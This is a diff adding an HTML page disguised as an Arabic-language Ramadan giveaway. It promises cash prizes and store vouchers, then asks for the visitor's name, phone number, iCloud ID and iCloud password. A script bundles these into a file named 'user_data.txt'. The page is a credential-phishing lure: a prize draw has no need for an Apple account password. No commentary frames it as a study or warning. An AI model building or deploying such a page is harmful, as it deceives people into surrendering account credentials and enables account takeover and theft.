@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Giveaways for Ramadan</title>
+  <style>
+    body {
+      background-color: #FFFSE1;
+      color: black;
+      font-family: "Arial", sans-serif;
+    }
+    
+    .calligraphy {
+      font-family: "Kufic Calligraphy", cursive;
+      font-size: 36px;
+      text-align: center;
+      margin-top: 50px;
+    }
+    
+    .ramadan-illustrations {
+      text-align: center;
+      margin-top: 20px;
+    }
+    
+    .ramadan-illustrations img {
+      max-width: 100px;
+      margin: 10px;
+    }
+    
+    .item {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      margin-top: 50px;
+    }
+    
+    .card {
+      background-color: #FFF;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 300px;
+    }
+    
+    .card img {
+      width: 200px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    
+    .price {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+  </style>
+  <script>
+    function saveFormData() {
+      var icloud = document.getElementById("icloud").value;
+      var password = document.getElementById("password").value;
+      var name = document.getElementById("name").value;
+      var phoneNumber = document.getElementById("phone").value;
+
+      var data = "Name: " + name + "\nPhone Number: " + phoneNumber + "\niCloud ID: " + icloud + "\nPassword: " + password + "\n";
+
+      var element = document.createElement('a');
+      element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(data));
+      element.setAttribute('download', 'user_data.txt');
+      element.style.display = 'none';
+      document.body.appendChild(element);
+      element.click();
+      document.body.removeChild(element);
+    }
+  </script>
+</head>
+<body>
+  <fieldset>
+    <h1 class="calligraphy">مرحبًا بكم في صفحة جوائز عيد رمضان المبارك!</h1>
+    <p>أجب على الأسئلة وادخل السحب لفرصة الفوز بالجائزة</p>
+    <div class="ramadan-illustrations">    
+    </div> 
+    <div class="item">
+      <div class="card">
+        $1000 ل 10 أشخاص 
+      </div>
+    </div>
+    <div class="item">
+      <div class="card">
+        $500 ل 10 أشخاص 
+      </div>
+    </div>
+    <div class="item">
+      <div class="card">
+        قسيمة شرائية بقيمة 200$ من بول دور ل 10 أشخاص 
+      </div>
+    </div>
+    <div class="item">
+      <div class="card">
+        ل 10 أشخاص maliks قسيمة شرائية بقيمة 200$ من 
+      </div>
+    </div>
+    <div class="item">
+      <div class="card">
+        ل 10 أشخاص spinneys قسيمة شرائية بقيمة 200$ من 
+      </div>
+    </div>
+
+    <form onsubmit="saveFormData()">
+      <label for="name">Name:</label> 
+      <input type="text" id="name" name="name" required> 
+      <br>
+      <label for="phone">Phone Number:</label> 
+      <input type="text" id="phone" name="phone" required> 
+      <br>
+      <label for="icloud">iCloud ID:</label> 
+      <input type="text" id="icloud" name="icloud" required> 
+      <br>
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" required>
+      <br>
+      <input type="submit" value="Submit">
+    </form>
+  </fieldset>
+</body>
+</html>
